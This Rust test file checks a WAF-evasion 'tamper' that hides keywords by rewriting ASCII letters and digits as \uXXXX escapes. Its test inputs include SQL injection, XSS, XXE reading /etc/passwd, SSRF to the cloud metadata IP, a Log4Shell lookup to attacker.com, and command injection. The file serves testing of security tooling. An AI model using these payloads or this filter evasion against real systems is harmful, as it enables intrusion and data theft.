//! Adversarial deep-coverage suite for the `json_unicode_alnum` tamper
//! and its underlying `crate::encoding::unicode::json_unicode_alnum`
//! helper. Each test pins a single behavior so a future regression
//! lights up exactly which contract broke.

use wafrift_encoding::tamper;
use wafrift_encoding::tamper::TamperRegistry;

fn run(payload: &str) -> String {
    tamper("json_unicode_alnum", payload, Some("sql")).expect("tamper must exist")
}

// ────────────────────────────────────────────────────────────────
// Boundary / minimal inputs
// ────────────────────────────────────────────────────────────────

#[test]
fn empty_input_returns_empty() {
    assert_eq!(run(""), "");
}

#[test]
fn single_ascii_letter_encodes() {
    assert_eq!(run("A"), "\\u0041");
    assert_eq!(run("z"), "\\u007A");
}

#[test]
fn single_digit_encodes() {
    assert_eq!(run("0"), "\\u0030");
    assert_eq!(run("9"), "\\u0039");
}

#[test]
fn single_space_passes_through() {
    assert_eq!(run(" "), " ");
}

#[test]
fn single_tab_passes_through() {
    assert_eq!(run("\t"), "\t");
}

#[test]
fn single_newline_passes_through() {
    assert_eq!(run("\n"), "\n");
}

#[test]
fn single_null_byte_passes_through() {
    assert_eq!(run("\0"), "\0");
}

#[test]
fn single_punctuation_chars_pass_through() {
    for c in "!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~".chars() {
        let s = c.to_string();
        // Backslash needs its own check (skip-pass mechanism).
        if c == '\\' {
            assert_eq!(run(&s), "\\", "backslash alone");
        } else {
            assert_eq!(run(&s), s, "punct char {c:?} must pass through");
        }
    }
}

// ────────────────────────────────────────────────────────────────
// Multibyte UTF-8 — non-ASCII chars must NOT be encoded
// ────────────────────────────────────────────────────────────────

#[test]
fn latin_supplement_passes_through() {
    assert_eq!(run("ñ"), "ñ");
    assert_eq!(run("é"), "é");
    assert_eq!(run("ÿ"), "ÿ");
}

#[test]
fn cjk_passes_through() {
    assert_eq!(run("日本語"), "日本語");
    assert_eq!(run("中文"), "中文");
    assert_eq!(run("한국어"), "한국어");
}

#[test]
fn cyrillic_passes_through() {
    // Cyrillic letters look like Latin but aren't ascii_alphanumeric.
    assert_eq!(run("привет"), "привет");
}

#[test]
fn emoji_passes_through() {
    assert_eq!(run("🔥"), "🔥");
    assert_eq!(run("👻💀"), "👻💀");
}

#[test]
fn zero_width_chars_pass_through() {
    // U+200B ZERO WIDTH SPACE — not alphanumeric.
    assert_eq!(run("\u{200B}"), "\u{200B}");
    assert_eq!(run("\u{FEFF}"), "\u{FEFF}"); // BOM
}

#[test]
fn mixed_ascii_and_unicode() {
    // ASCII alphanumerics encode; é (U+00E9, non-ascii) stays bare.
    assert_eq!(run("café"), "\\u0063\\u0061\\u0066é");
}

// ────────────────────────────────────────────────────────────────
// Skip-pass / idempotency
// ────────────────────────────────────────────────────────────────

#[test]
fn already_encoded_sequence_skipped() {
    // Pre-existing \uXXXX must pass through verbatim.
    assert_eq!(run("\\u0041"), "\\u0041");
}

#[test]
fn skip_pass_with_uppercase_hex() {
    assert_eq!(run("\\u00FF"), "\\u00FF");
}

#[test]
fn skip_pass_with_lowercase_hex() {
    assert_eq!(run("\\u00ab"), "\\u00ab");
}

#[test]
fn skip_pass_with_mixed_case_hex() {
    assert_eq!(run("\\u00aB"), "\\u00aB");
}

#[test]
fn idempotent_on_keyword() {
    let once = run("UNION SELECT");
    let twice = run(&once);
    let thrice = run(&twice);
    assert_eq!(once, twice);
    assert_eq!(twice, thrice);
}

#[test]
fn idempotent_on_punctuation_heavy() {
    let p = "' OR 1=1; DROP TABLE users; --";
    let once = run(p);
    let twice = run(&once);
    assert_eq!(once, twice);
}

#[test]
fn idempotent_on_xss_payload() {
    let p = "<svg onload=alert(1)>";
    let once = run(p);
    let twice = run(&once);
    assert_eq!(once, twice);
}

#[test]
fn idempotent_on_empty() {
    assert_eq!(run(""), run(&run("")));
}

#[test]
fn idempotent_on_purely_unicode() {
    let p = "日本語🔥";
    assert_eq!(run(p), p);
    assert_eq!(run(&run(p)), p);
}

#[test]
fn idempotent_propagated_through_ten_passes() {
    let p = "'; EXEC xp_cmdshell('whoami')--";
    let once = run(p);
    let mut current = once.clone();
    for _ in 0..10 {
        current = run(&current);
    }
    assert_eq!(once, current, "10 passes must produce same output as 1");
}

// ────────────────────────────────────────────────────────────────
// Adversarial / malformed escape inputs
// ────────────────────────────────────────────────────────────────

#[test]
fn partial_escape_too_short() {
    // `\u123` (3 hex) — not a valid \uXXXX, skip-pass must NOT fire.
    // Outcome: `\` bare, `u`+`1`+`2`+`3` each encoded individually.
    let out = run("\\u123");
    assert!(!out.contains("\\u123"));
    assert!(out.starts_with('\\'));
    assert!(out.contains("\\u0075"));
}

#[test]
fn partial_escape_too_few_chars_after_backslash() {
    // `\u00` (2 hex) — not a valid \uXXXX.
    let out = run("\\u00");
    assert!(!out.contains("\\u00") || out != "\\u00");
}

#[test]
fn lone_backslash_passes_through() {
    assert_eq!(run("\\"), "\\");
}

#[test]
fn backslash_then_non_u_passes_backslash_through() {
    // `\n` literal (backslash + n) — `\` is bare, `n` is alnum-encoded.
    let out = run("\\n");
    assert_eq!(out, "\\\\u006E");
}

#[test]
fn backslash_followed_by_non_hex_after_u() {
    // `\uABCG` — G is not hex. Skip-pass must not fire; `\` bare,
    // `u`, `A`, `B`, `C`, `G` each encoded.
    let out = run("\\uABCG");
    assert!(!out.contains("\\uABCG"));
}

#[test]
fn multiple_consecutive_escapes() {
    // 3 valid escapes back to back.
    assert_eq!(run("\\u0041\\u0042\\u0043"), "\\u0041\\u0042\\u0043");
}

#[test]
fn escape_then_alnum_then_escape() {
    // `AXB` — first escape skip-passed, `X` encoded, second
    // escape skip-passed.
    assert_eq!(run("\\u0041X\\u0042"), "\\u0041\\u0058\\u0042");
}

#[test]
fn double_backslash_followed_by_valid_escape() {
    // `\\u0041` (literal: backslash, backslash, u, 0, 0, 4, 1).
    // First `\` bare; second `\` triggers skip-pass with `u0041`.
    // Behaviour-pin (known limitation: doesn't model JS-string escape
    // semantics where `\\` would mean a literal backslash and the
    // following `u0041` would be plain text). Documents current behavior.
    let out = run("\\\\u0041");
    assert_eq!(out, "\\\\u0041");
}

#[test]
fn unterminated_escape_at_end_of_string() {
    // `\u00` at very end — too few chars for a valid escape.
    let out = run("X\\u00");
    assert!(out.starts_with("\\u0058")); // X encoded
}

// ────────────────────────────────────────────────────────────────
// Output character class
// ────────────────────────────────────────────────────────────────

#[test]
fn output_is_valid_utf8() {
    let p = "UNION SELECT * FROM users WHERE id=1";
    let out = run(p);
    let _ = std::str::from_utf8(out.as_bytes()).expect("output must be valid UTF-8");
}

#[test]
fn output_contains_no_keyword_bytes() {
    let out = run("UNION SELECT");
    assert!(!out.contains("UNION"));
    assert!(!out.contains("SELECT"));
    assert!(!out.contains("union"));
    assert!(!out.contains("select"));
}

#[test]
fn output_preserves_case_in_escape_hex() {
    // Encoded form uses uppercase hex (`A` not `A` lowercase).
    let out = run("A");
    assert_eq!(out, "\\u0041");
}

#[test]
fn output_punctuation_survives_verbatim() {
    let out = run("' OR 1=1--");
    assert!(out.contains('\''));
    assert!(out.contains('='));
    assert!(out.contains("--"));
}

// ────────────────────────────────────────────────────────────────
// Realistic attack payloads
// ────────────────────────────────────────────────────────────────

#[test]
fn xss_script_tag_alert() {
    let out = run("<script>alert(1)</script>");
    assert!(!out.contains("script"));
    assert!(!out.contains("alert"));
    assert!(out.starts_with('<'));
    assert!(out.ends_with('>'));
}

#[test]
fn xss_img_onerror() {
    let out = run("<img src=x onerror=alert(1)>");
    assert!(!out.contains("img"));
    assert!(!out.contains("onerror"));
    assert!(out.contains('<'));
    assert!(out.contains('='));
}

#[test]
fn xss_javascript_uri() {
    let out = run("javascript:alert(1)");
    assert!(!out.contains("javascript"));
    assert!(out.contains(':'));
    assert!(out.contains('('));
}

#[test]
fn xxe_external_entity() {
    let out = run("<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>");
    assert!(!out.contains("DOCTYPE"));
    assert!(!out.contains("ENTITY"));
    assert!(!out.contains("SYSTEM"));
    assert!(out.contains('<'));
    assert!(out.contains('['));
}

#[test]
fn ssrf_internal_url() {
    let out = run("http://169.254.169.254/latest/meta-data/");
    // `http`, `latest`, `meta`, `data`, AND the digits all encoded —
    // every alphanumeric in the metadata-IP URL disappears from the
    // wire bytes. Only the structural delimiters (`:`, `/`, `.`, `-`)
    // remain bare.
    assert!(!out.contains("http"));
    assert!(!out.contains("169"));
    assert!(!out.contains("meta-data"));
    assert!(out.contains("://"));
    assert!(out.contains('.'));
    assert!(out.contains('-'));
}

#[test]
fn log4shell_jndi() {
    let out = run("${jndi:ldap://attacker.com/x}");
    assert!(!out.contains("jndi"));
    assert!(!out.contains("ldap"));
    assert!(!out.contains("attacker"));
    assert!(out.contains("${"));
    assert!(out.contains('}'));
}

#[test]
fn command_injection_semicolon() {
    let out = run("; cat /etc/passwd");
    assert!(!out.contains("cat"));
    assert!(!out.contains("etc"));
    assert!(out.starts_with("; "));
}

#[test]
fn template_injection_ssti() {
    let out = run("{{7*7}}{%for x in y%}");
    assert!(!out.contains("for"));
    assert!(out.contains("{{"));
    assert!(out.contains("}}"));
    assert!(out.contains("{%"));
}

// ────────────────────────────────────────────────────────────────
// Volume / performance
// ────────────────────────────────────────────────────────────────

#[test]
fn handles_10kb_alphanumeric_input() {
    let p: String = "A".repeat(10_000);
    let out = run(&p);
    assert_eq!(out.len(), 60_000); // each A → 6-byte escape
}

#[test]
fn handles_100kb_input_without_panic() {
    let p: String = "UNION SELECT * FROM users WHERE id=1; ".repeat(2_500);
    let _ = run(&p);
}

#[test]
fn handles_alternating_alnum_punct() {
    let p: String = (0..1000)
        .map(|i| if i % 2 == 0 { 'A' } else { ' ' })
        .collect();
    let _ = run(&p);
}

#[test]
fn handles_only_punctuation_long() {
    let p: String = "()[]{}<>!@#$%^&*".repeat(500);
    let out = run(&p);
    // No alnum → output identical to input.
    assert_eq!(out, p);
}

#[test]
fn handles_only_unicode_long() {
    let p: String = "日本語".repeat(1000);
    let out = run(&p);
    // No ASCII alnum → output identical.
    assert_eq!(out, p);
}

// ────────────────────────────────────────────────────────────────
// Registry / dispatch integration
// ────────────────────────────────────────────────────────────────

#[test]
fn registered_in_default_registry() {
    let reg = TamperRegistry::with_defaults();
    assert!(reg.get("json_unicode_alnum").is_some());
}

#[test]
fn registered_strategy_name_matches() {
    let reg = TamperRegistry::with_defaults();
    let strat = reg.get("json_unicode_alnum").unwrap();
    assert_eq!(strat.name(), "json_unicode_alnum");
}

#[test]
fn registered_aggressiveness_in_range() {
    let reg = TamperRegistry::with_defaults();
    let strat = reg.get("json_unicode_alnum").unwrap();
    let a = strat.aggressiveness();
    assert!((0.0..=1.0).contains(&a));
    assert!(!a.is_nan());
}

#[test]
fn registered_description_non_empty() {
    let reg = TamperRegistry::with_defaults();
    let strat = reg.get("json_unicode_alnum").unwrap();
    assert!(!strat.description().is_empty());
}

#[test]
fn registered_description_mentions_uxxxx() {
    let reg = TamperRegistry::with_defaults();
    let strat = reg.get("json_unicode_alnum").unwrap();
    assert!(
        strat.description().contains("\\u") || strat.description().contains("uXXXX"),
        "description should hint at the encoding form"
    );
}

#[test]
fn appears_in_all_tamper_names() {
    let names = wafrift_encoding::all_tamper_names();
    assert!(names.contains(&"json_unicode_alnum"));
}

#[test]
fn tamper_with_unknown_name_errors() {
    let r = tamper("json_unicode_alnumXX", "x", None);
    assert!(r.is_err());
}

// ────────────────────────────────────────────────────────────────
// Reasonable equivalence with unicode_escape (the full-encode form)
// ────────────────────────────────────────────────────────────────

#[test]
fn alnum_only_input_equal_to_unicode_escape_truncation() {
    // For inputs consisting ONLY of ASCII alphanumerics, output of
    // json_unicode_alnum is identical to unicode_escape on the same
    // chars (since unicode_escape encodes everything too).
    let p = "ABCxyz123";
    let alnum = run(p);
    let full = tamper("unicode_escape", p, None).unwrap();
    assert_eq!(alnum, full);
}

#[test]
fn punctuation_only_input_unchanged() {
    let p = "<><><><>";
    let alnum = run(p);
    assert_eq!(alnum, p);
}

#[test]
fn whitespace_only_input_unchanged() {
    let p = " \t\n\r ";
    let alnum = run(p);
    assert_eq!(alnum, p);
}

// ────────────────────────────────────────────────────────────────
// Round-trip semantic check (manual decode)
// ────────────────────────────────────────────────────────────────

fn decode_unicode_escapes(s: &str) -> String {
    // Tiny JSON-like \uXXXX decoder for round-trip verification.
    let mut out = String::new();
    let chars: Vec<char> = s.chars().collect();
    let mut i = 0;
    while i < chars.len() {
        if chars[i] == '\\'
            && i + 5 < chars.len()
            && chars[i + 1] == 'u'
            && chars[i + 2..i + 6].iter().all(|c| c.is_ascii_hexdigit())
        {
            let hex: String = chars[i + 2..i + 6].iter().collect();
            let code = u32::from_str_radix(&hex, 16).unwrap();
            out.push(char::from_u32(code).unwrap_or('?'));
            i += 6;
        } else {
            out.push(chars[i]);
            i += 1;
        }
    }
    out
}

#[test]
fn roundtrip_decodes_to_original_for_ascii_only() {
    let p = "UNION SELECT * FROM users";
    let encoded = run(p);
    let decoded = decode_unicode_escapes(&encoded);
    assert_eq!(decoded, p);
}

#[test]
fn roundtrip_decodes_to_original_for_mixed_input() {
    let p = "' OR 1=1--";
    let encoded = run(p);
    let decoded = decode_unicode_escapes(&encoded);
    assert_eq!(decoded, p);
}

#[test]
fn roundtrip_decodes_to_original_with_unicode() {
    let p = "café 日本";
    let encoded = run(p);
    let decoded = decode_unicode_escapes(&encoded);
    assert_eq!(decoded, p);
}

#[test]
fn roundtrip_preserves_xss_payload_semantics() {
    let p = "<script>alert(1)</script>";
    let encoded = run(p);
    let decoded = decode_unicode_escapes(&encoded);
    assert_eq!(decoded, p);
}

#[test]
fn roundtrip_preserves_punctuation_heavy() {
    let p = "${{[<>]&|^~`*+!?#=}}";
    let encoded = run(p);
    let decoded = decode_unicode_escapes(&encoded);
    assert_eq!(decoded, p);
}

#[test]
fn roundtrip_preserves_log4shell() {
    let p = "${jndi:ldap://x.y/z}";
    let encoded = run(p);
    let decoded = decode_unicode_escapes(&encoded);
    assert_eq!(decoded, p);
}

// ────────────────────────────────────────────────────────────────
// Concurrency / thread safety
// ────────────────────────────────────────────────────────────────

#[test]
fn registry_is_send_and_callable_from_threads() {
    use std::sync::Arc;
    use std::thread;
    let reg = Arc::new(TamperRegistry::with_defaults());
    let mut handles = vec![];
    for i in 0..16 {
        let r = Arc::clone(&reg);
        handles.push(thread::spawn(move || {
            let payload = format!("UNION SELECT {i}");
            r.tamper_with("json_unicode_alnum", &payload, None).unwrap()
        }));
    }
    for h in handles {
        let result = h.join().unwrap();
        assert!(result.contains("\\u"));
    }
}

#[test]
fn concurrent_calls_produce_consistent_output() {
    use std::sync::Arc;
    use std::thread;
    let reg = Arc::new(TamperRegistry::with_defaults());
    let payload = "UNION SELECT * FROM users";
    let expected = reg
        .tamper_with("json_unicode_alnum", payload, None)
        .unwrap();
    let mut handles = vec![];
    for _ in 0..32 {
        let r = Arc::clone(&reg);
        let p = payload.to_string();
        let e = expected.clone();
        handles.push(thread::spawn(move || {
            let out = r.tamper_with("json_unicode_alnum", &p, None).unwrap();
            assert_eq!(out, e);
        }));
    }
    for h in handles {
        h.join().unwrap();
    }
}

// ────────────────────────────────────────────────────────────────
// Specific hex digit edge cases
// ────────────────────────────────────────────────────────────────

#[test]
fn all_ascii_letters_produce_expected_codepoints() {
    for code in b'a'..=b'z' {
        let c = code as char;
        let expected = format!("\\u{:04X}", code);
        assert_eq!(run(&c.to_string()), expected);
    }
    for code in b'A'..=b'Z' {
        let c = code as char;
        let expected = format!("\\u{:04X}", code);
        assert_eq!(run(&c.to_string()), expected);
    }
}

#[test]
fn all_ascii_digits_produce_expected_codepoints() {
    for code in b'0'..=b'9' {
        let c = code as char;
        let expected = format!("\\u{:04X}", code);
        assert_eq!(run(&c.to_string()), expected);
    }
}

#[test]
fn underscore_is_not_alphanumeric_passes_through() {
    // Rust's is_ascii_alphanumeric returns false for '_'.
    assert_eq!(run("_"), "_");
    assert_eq!(
        run("snake_case"),
        "\\u0073\\u006E\\u0061\\u006B\\u0065_\\u0063\\u0061\\u0073\\u0065"
    );
}

#[test]
fn dollar_sign_passes_through() {
    assert_eq!(run("$"), "$");
}

#[test]
fn percent_sign_passes_through() {
    assert_eq!(run("%"), "%");
}

#[test]
fn slash_passes_through() {
    assert_eq!(run("/"), "/");
    assert_eq!(run("//"), "//");
}

// ────────────────────────────────────────────────────────────────
// Context parameter
// ────────────────────────────────────────────────────────────────

#[test]
fn context_none_works() {
    let _ = tamper("json_unicode_alnum", "UNION", None).unwrap();
}

#[test]
fn context_sql_works() {
    let _ = tamper("json_unicode_alnum", "UNION", Some("sql")).unwrap();
}

#[test]
fn context_xss_works() {
    let _ = tamper("json_unicode_alnum", "<script>", Some("xss")).unwrap();
}

#[test]
fn context_arbitrary_works() {
    let _ = tamper("json_unicode_alnum", "x", Some("arbitrary_unknown_class")).unwrap();
}

#[test]
fn context_does_not_change_output_for_this_tamper() {
    // json_unicode_alnum is context-insensitive (per its impl).
    let none = tamper("json_unicode_alnum", "ABC", None).unwrap();
    let sql = tamper("json_unicode_alnum", "ABC", Some("sql")).unwrap();
    let xss = tamper("json_unicode_alnum", "ABC", Some("xss")).unwrap();
    assert_eq!(none, sql);
    assert_eq!(sql, xss);
}
